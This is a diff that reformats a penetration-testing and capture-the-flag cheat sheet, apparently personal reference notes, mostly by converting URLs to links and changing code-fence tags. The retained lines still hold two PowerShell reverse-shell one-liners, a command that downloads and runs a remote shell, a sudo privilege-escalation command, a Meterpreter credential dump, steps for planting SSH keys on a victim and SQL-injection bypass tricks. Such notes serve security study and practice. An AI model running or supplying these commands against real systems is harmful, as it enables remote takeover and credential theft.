@@ -53,7 +53,7 @@ Powershell wget [http://blog.stackexchange.com/](http://blog.stackexchange.com/)
 
 ## -----
 
-Windows enumeration: whoami /all net use z: \ tasklist /v \(verbose\) netstat -an Get-WmiObject -class Win32\_UserAccount \[-filter "LocalAccount=True"\]
+Windows enumeration: whoami /all net use z:  tasklist /v \(verbose\) netstat -an Get-WmiObject -class Win32\_UserAccount \[-filter "LocalAccount=True"\]
 
 ## -----
 
@@ -623,7 +623,8 @@ Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object
 ### PowerShell to retrieve Active Directory objects \(including deleted\)
 
 ### Decode LDAP Passwords
-https://dotnetfiddle.net/2RDoWz
+
+[https://dotnetfiddle.net/2RDoWz](https://dotnetfiddle.net/2RDoWz)
 
 ### mysql command line alternative
 
@@ -643,7 +644,7 @@ mysqldump
 kerbrute
 ```
 
-https://github.com/TarlogicSecurity/kerbrute
+[https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
 
 ### Crawls web pages for keywords
 
@@ -651,15 +652,15 @@ https://github.com/TarlogicSecurity/kerbrute
 cewl
 ```
 
-### TeamViewer Privilege Escalation -> CVE-2019-189888
+### TeamViewer Privilege Escalation -&gt; CVE-2019-189888
 
-```
+```text
 meterpreter &gt; run post/windows/gather/credentials/teamviewer\_passwords
 ```
 
 ### PowerShell Reverse Shell
 
-```PowerShell
+```text
 $client = New-Object System.Net.Sockets.TCPClient\('192.168.0.0',4444\);$stream = $client.GetStream\(\);\[byte\[\]\]$bytes = 0..65535\|%{0};while\(\($i = $stream.Read\($bytes, 0, $bytes.Length\)\) -ne 0\){;$data = \(New-Object -TypeName System.Text.ASCIIEncoding\).GetString\($bytes,0, $i\);$sendback = \(iex $data 2&gt;&1 \| Out-String \);$sendback2 = $sendback + 'PS ' + \(pwd\).Path + '&gt; ';$sendbyte = \(\[text.encoding\]::ASCII\).GetBytes\($sendback2\);$stream.Write\($sendbyte,0,$sendbyte.Length\);$stream.Flush\(\)};$client.Close\(\)
 
 $sm=\(New-Object Net.Sockets.TCPClient\('192.168.0.0',4444\)\).GetStream\(\);\[byte\[\]\]$bt=0..65535\|%{0};while\(\($i=$sm.Read\($bt,0,$bt.Length\)\) -ne 0\){;$d=\(New-Object Text.ASCIIEncoding\).GetString\($bt,0,$i\);$st=\(\[text.encoding\]::ASCII\).GetBytes\(\(iex $d 2&gt;&1\)\);$sm.Write\($st,0,$st.Length\)}
@@ -667,53 +668,52 @@ $sm=\(New-Object Net.Sockets.TCPClient\('192.168.0.0',4444\)\).GetStream\(\);\[b
 
 Pull the shell:
 
-```PowerShell
+```text
 powershell.exe -c "IEX \(New-Object Net.WebClient\).DownloadString\('SHELL URL'\)"
 ```
 
 ### Wget Alternative for Windows in PowerShell
 
-```PowerShell
+```text
 $client = new-object System.Net.WebClient $client.DownloadFile\("URL","Local Download Path"\)
-
 ```
 
-### CVE-2019-10-15 Sudo < 1.2.28 Privilege Escalation
+### CVE-2019-10-15 Sudo &lt; 1.2.28 Privilege Escalation
 
-```
+```text
 sudo -u#-1 /bin/bash
 ```
 
 ### Adminer Database Management Tool Exploit Bypass Login
 
-https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
+[https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)
 
 ### Alternate data streams of empty or incomplete file on SMB
-``allinfo *file*``
+
+`allinfo *file*`
 
 ### SMB Recursively List Files
-``recurse on``
-<br>
-``ls``
 
-### Telnet > Netcat
+`recurse on`   
+ `ls`
 
-When connecting to a service, where possible, choose TELNET over Netcat 
+### Telnet &gt; Netcat
+
+When connecting to a service, where possible, choose TELNET over Netcat
 
 ### /etc/update-motd.d Privilege Escalation
 
-https://blog.haao.sh/writeups/fowsniff-writeup/
+[https://blog.haao.sh/writeups/fowsniff-writeup/](https://blog.haao.sh/writeups/fowsniff-writeup/)
 
 ### SSH into Victim without password
 
-1. From the attacker machine generate RSA keypair: ``ssh-keygen -t rsa``
-2. Copy the public key (id_rsa.pub) into the ``.ssh/authorized_keys`` file of the victim
-3. SSH with the -i argument (id_rsa)
+1. From the attacker machine generate RSA keypair: `ssh-keygen -t rsa`
+2. Copy the public key \(id\_rsa.pub\) into the `.ssh/authorized_keys` file of the victim
+3. SSH with the -i argument \(id\_rsa\)
 
 ### Really Good Privilege Escalation Scripts
 
-https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
-
+[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
 
 ### XMPP Authentication Crack
 
@@ -754,7 +754,7 @@ for passlen in range(1,3):
 
 ### CTF Docs
 
-https://github.com/welchbj/ctf/tree/master/docs
+[https://github.com/welchbj/ctf/tree/master/docs](https://github.com/welchbj/ctf/tree/master/docs)
 
 ### Test for LDAP NULL BIND
 
@@ -764,43 +764,42 @@ ldapsearch -H ldap://host:port -x -s base '' "(objectClass=*)" "*" +
 
 ### Extract VBA Script from document
 
-https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php
+[https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php](https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php)
 
 ### Decode Rubber Ducky USB .bin payloads
 
-https://ducktoolkit.com/decode#
+[https://ducktoolkit.com/decode\#](https://ducktoolkit.com/decode#)
 
 ### Crack Android lockscreen from system files \(gesture.key\)
 
-https://github.com/KieronCraggs/GestureCrack
+[https://github.com/KieronCraggs/GestureCrack](https://github.com/KieronCraggs/GestureCrack)
 
 ### XOR Analysis
 
-https://github.com/hellman/xortool
+[https://github.com/hellman/xortool](https://github.com/hellman/xortool)
 
 ### Cryptanalysis
 
-https://github.com/nccgroup/featherduster
+[https://github.com/nccgroup/featherduster](https://github.com/nccgroup/featherduster)
 
 ### RSA Cracking Tools
 
-* https://github.com/Ganapati/RsaCtfTool
-* https://github.com/ius/rsatool
-
+* [https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
+* [https://github.com/ius/rsatool](https://github.com/ius/rsatool)
 
 ### Morse Code Audio Decode
 
-https://morsecode.world/international/decoder/audio-decoder-adaptive.html
+[https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
 
 ### Text to 21 Common Ciphers
 
-https://v2.cryptii.com/text/select
+[https://v2.cryptii.com/text/select](https://v2.cryptii.com/text/select)
 
 ### Crypto Example Challenges
 
-https://asecuritysite.com/encryption/ctf?mybutton=
+[https://asecuritysite.com/encryption/ctf?mybutton=](https://asecuritysite.com/encryption/ctf?mybutton=)
 
-### Shift in Python (crypto)
+### Shift in Python \(crypto\)
 
 ```python
 with open('FILENAME') as f:
@@ -811,7 +810,7 @@ with open('FILENAME') as f:
 
 ### Predict encoding/crypto type
 
-https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')
+[https://gchq.github.io/CyberChef/\#recipe=Magic\(3,false,false](https://gchq.github.io/CyberChef/#recipe=Magic%283,false,false),''\)
 
 ### Get data, process and respond over a socket
 
@@ -866,10 +865,10 @@ _Values \(payload depends on the columns structure\)_
 
 ### SQL Injection Little Tips
 
-`--` -&gt; Linux   
- `--+` -&gt; Windows   
- `%23 (#)` -&gt; Hash   
- `%2527 (')` -&gt; bypass urldecode\(urldecode\(htmlspecialchars\(, ENT\_QUOTES\)\)\);
+`--` -&gt; Linux  
+`--+` -&gt; Windows  
+`%23 (#)` -&gt; Hash  
+`%2527 (')` -&gt; bypass urldecode\(urldecode\(htmlspecialchars\(, ENT\_QUOTES\)\)\);
 
 ### Manual UNION SQL Injection
 
@@ -911,7 +910,7 @@ UNunionION SEselectLECT 1,2,3%23
 
 _Download pkcrack_
 
-https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/download1.html
+[https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/download1.html](https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/download1.html)
 
 ! Before using, it must be built from source
 
@@ -927,7 +926,6 @@ _Syntax_
 * Strings: [https://www.w3schools.com/python/python\_ref\_string.asp](https://www.w3schools.com/python/python_ref_string.asp)   
 * Keyworks: [https://www.w3schools.com/python/python\_ref\_keywords.asp](https://www.w3schools.com/python/python_ref_keywords.asp)   
 * Random: [https://www.w3schools.com/python/module\_random.asp](https://www.w3schools.com/python/module_random.asp)   
-
 
 ### PHP Functions
 
